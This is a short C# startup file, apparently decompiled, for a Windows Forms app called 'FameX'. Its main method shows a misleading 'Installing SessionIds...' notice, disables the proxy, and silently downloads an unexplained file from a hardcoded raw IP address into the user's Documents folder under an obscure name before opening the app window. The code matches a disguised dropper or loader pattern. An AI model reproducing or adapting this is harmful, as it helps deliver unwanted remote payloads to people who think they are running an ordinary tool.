using System;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace FameX;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		if (!File.Exists(folderPath + "\\9oeiture"))
		{
			MessageBox.Show("Installing SessionIds...", "Notice", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			WebClient webClient = new WebClient();
			webClient.Proxy = null;
			webClient.DownloadFile("http://51.77.175.204/file", folderPath + "\\9oeiture");
			MessageBox.Show("Done!", "Notice", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(defaultValue: false);
		Application.Run(new Form1());
	}
}
